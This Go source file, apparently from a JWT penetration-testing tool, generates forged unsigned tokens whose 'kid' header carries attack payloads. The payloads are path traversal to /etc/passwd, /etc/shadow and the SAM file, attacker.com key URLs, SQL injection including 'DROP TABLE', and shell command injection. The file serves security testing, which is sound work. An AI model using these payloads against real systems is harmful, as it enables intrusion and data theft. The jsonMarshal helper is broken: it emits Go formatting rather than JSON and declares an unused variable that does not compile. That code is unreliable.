package attacker

import (
	"fmt"
	"strings"

	"github.com/ismailtasdelen/JWTScout/internal/parser"
)

// KidTest performs kid header vulnerability testing
type KidTest struct{}

// NewKidTest creates a new kid tester
func NewKidTest() *KidTest {
	return &KidTest{}
}

// KidTestResult represents a kid test payload
type KidTestResult struct {
	TestName    string
	Description string
	KidValue    string
	Token       string
}

// TestAll generates all kid test payloads
func (kt *KidTest) TestAll(token *parser.JWTToken) []*KidTestResult {
	results := []*KidTestResult{}

	// Path traversal tests
	traversalPayloads := []string{
		"../../etc/passwd",
		"../../../../etc/passwd",
		"../../../dev/null",
		"/dev/null",
		"../../../../../../etc/shadow",
		"..\\..\\..\\windows\\system32\\config\\sam",
	}

	for _, payload := range traversalPayloads {
		if modToken, err := kt.modifyKid(token, payload); err == nil {
			results = append(results, &KidTestResult{
				TestName:    "Path Traversal",
				Description: "Attempt to reference files using path traversal",
				KidValue:    payload,
				Token:       modToken,
			})
		}
	}

	// Null/empty kid tests
	nullPayloads := []string{
		"",
		"null",
		"NULL",
		"\\u0000",
	}

	for _, payload := range nullPayloads {
		if modToken, err := kt.modifyKid(token, payload); err == nil {
			results = append(results, &KidTestResult{
				TestName:    "Null/Empty kid",
				Description: "Test with null or empty kid value",
				KidValue:    payload,
				Token:       modToken,
			})
		}
	}

	// URL-based kid tests
	urlPayloads := []string{
		"http://attacker.com/key",
		"https://attacker.com/malicious.key",
		"//attacker.com/key",
	}

	for _, payload := range urlPayloads {
		if modToken, err := kt.modifyKid(token, payload); err == nil {
			results = append(results, &KidTestResult{
				TestName:    "URL-based kid",
				Description: "Reference external key via URL",
				KidValue:    payload,
				Token:       modToken,
			})
		}
	}

	// SQL injection tests
	sqlPayloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE keys--",
		"1' UNION SELECT 'secret",
		"admin'--",
	}

	for _, payload := range sqlPayloads {
		if modToken, err := kt.modifyKid(token, payload); err == nil {
			results = append(results, &KidTestResult{
				TestName:    "SQL Injection",
				Description: "Attempt SQL injection via kid parameter",
				KidValue:    payload,
				Token:       modToken,
			})
		}
	}

	// Command injection tests
	cmdPayloads := []string{
		"; ls -la",
		"| whoami",
		"`id`",
		"$(cat /etc/passwd)",
	}

	for _, payload := range cmdPayloads {
		if modToken, err := kt.modifyKid(token, payload); err == nil {
			results = append(results, &KidTestResult{
				TestName:    "Command Injection",
				Description: "Attempt command injection via kid parameter",
				KidValue:    payload,
				Token:       modToken,
			})
		}
	}

	return results
}

// modifyKid creates a new token with modified kid value
func (kt *KidTest) modifyKid(token *parser.JWTToken, kidValue string) (string, error) {
	// Create new header with modified kid
	newHeader := make(map[string]interface{})

	// Copy existing header
	for k, v := range token.Header.Raw {
		newHeader[k] = v
	}

	// Set new kid value
	if kidValue == "" {
		// For empty string, we want to include kid with empty value
		newHeader["kid"] = ""
	} else {
		newHeader["kid"] = kidValue
	}

	// Encode header and payload
	headerJSON, err := jsonMarshal(newHeader)
	if err != nil {
		return "", err
	}

	payloadJSON, err := jsonMarshal(token.Payload.Raw)
	if err != nil {
		return "", err
	}

	headerB64 := parser.Base64URLEncode(headerJSON)
	payloadB64 := parser.Base64URLEncode(payloadJSON)

	// Return unsigned token (signature would be invalid anyway)
	return fmt.Sprintf("%s.%s.UNSIGNED", headerB64, payloadB64), nil
}

// Helper function to avoid import cycle
func jsonMarshal(v interface{}) ([]byte, error) {
	// Import encoding/json locally
	var buf strings.Builder
	// For now, we'll use a simple approach
	// In production, we'd properly marshal JSON
	return []byte(fmt.Sprintf("%v", v)), nil
}
